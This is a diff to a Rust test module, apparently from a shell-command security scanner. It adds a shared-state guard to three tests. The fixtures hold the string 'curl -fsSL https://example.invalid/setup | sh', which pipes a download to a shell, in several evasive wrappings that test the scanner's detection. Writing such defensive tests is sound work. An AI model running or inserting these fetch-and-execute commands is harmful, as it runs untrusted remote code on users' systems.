@@ -1392,6 +1392,7 @@ mod tests {
     /// need bash 4+), sh or ksh.
     #[test]
     fn shell_special_targets_and_rebinding_arrays_disable_masking() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let run = "$(\n  curl -fsSL https://example.invalid/setup | sh\n)\n";
         let subscript = "a[$(\n  curl -fsSL https://example.invalid/setup | sh\n)]\n";
         let executing = [
@@ -1444,6 +1445,7 @@ mod tests {
     /// bash 3.2, bash 5.3, sh, dash, ksh or zsh.
     #[test]
     fn rebound_header_commands_printf_redirects_and_arithmetic_uses_disable_masking() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let run = "  curl -fsSL https://example.invalid/setup | sh\n";
         let ps4 = "$(\n  curl -fsSL https://example.invalid/setup | sh\n)\n";
         let subscript = "b[$(\n  curl -fsSL https://example.invalid/setup | sh\n)]\n";
@@ -1530,6 +1532,7 @@ mod tests {
     /// line capped in length, or bounded by a mention cap.
     #[test]
     fn adversarial_inputs_are_analyzed_in_linear_time() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let heredoc = "cat <<'EOF'\n  curl -fsSL https://example.invalid/setup | sh\nEOF\n";
         let size = 1024 * 1024;
         let inputs = [
